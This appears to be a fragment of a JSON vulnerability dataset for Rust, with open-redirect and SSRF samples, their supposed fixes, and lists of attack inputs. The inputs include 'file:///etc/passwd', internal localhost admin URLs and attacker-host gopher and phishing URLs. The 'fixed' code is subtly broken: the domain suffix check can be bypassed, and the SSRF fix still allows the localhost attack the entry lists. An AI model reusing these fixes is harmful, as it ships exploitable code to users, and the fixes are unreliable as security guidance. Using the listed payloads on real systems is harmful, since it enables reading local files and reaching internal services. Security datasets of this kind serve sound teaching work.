        "vulnerability_code": "pub struct Redirector {\n    url: String,\n}\n\nimpl Redirector {\n    pub fn new(url: &str) -> Self {\n        Redirector { url: url.to_string() }\n    }\n\n    pub fn redirect(&self) {\n        println!(\"Redirecting to: {}\", self.url);\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "use url::Url;\npub struct Redirector {\n    url: String,\n}\n\nimpl Redirector {\n    pub fn new(url: &str) -> Self {\n        let parsed_url = Url::parse(url).expect(\"Invalid URL\");\n        if !parsed_url.domain().unwrap_or_default().ends_with(\"example.com\") {\n            panic!(\"URL must be within example.com\");\n        }\n        Redirector { url: url.to_string() }\n    }\n\n    pub fn redirect(&self) {\n        println!(\"Redirecting to: {}\", self.url);\n    }\n}",
        "exploit_ways": [
            "An attacker could provide a URL pointing to an external malicious site, e.g., http://malicious.com.",
            "Attackers might use crafted URLs to redirect users to phishing sites that look similar to legitimate ones, e.g., https://legitimate-looking.example.org.evil.com.",
            "By exploiting open redirects, attackers can manipulate the redirection to perform actions requiring user interaction, such as authorizing access to their applications."
        ]
    },
    "rust_49": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "use std::process::Command;\n\nfn fetch_url(url: &str) -> Result<String, std::io::Error> {\n    let output = Command::new(\"curl\")\n        .arg(url)\n        .output()\n        .expect(\"Failed to execute command\");\n\n    if output.status.success() {\n        Ok(String::from_utf8_lossy(&output.stdout).to_string())\n    } else {\n        Err(std::io::Error::new(std::io::ErrorKind::Other, \"Command failed\"))\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "use std::process::Command;\n\nfn fetch_url(url: &str) -> Result<String, std::io::Error> {\n    if !url.starts_with(\"http://\") && !url.starts_with(\"https://\") {\n        return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, \"URL must start with http:// or https://\"));\n    }\n\n    let output = Command::new(\"curl\")\n        .arg(url)\n        .output()\n        .expect(\"Failed to execute command\");\n\n    if output.status.success() {\n        Ok(String::from_utf8_lossy(&output.stdout).to_string())\n    } else {\n        Err(std::io::Error::new(std::io::ErrorKind::Other, \"Command failed\"))\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'file:///etc/passwd' to read local files.",
            "They could use 'http://localhost:8080/admin' to access internal web services if running on the same host.",
            "Inputting 'gopher://attacker.com/' might allow interaction with external services in unexpected ways."
        ]
    }
}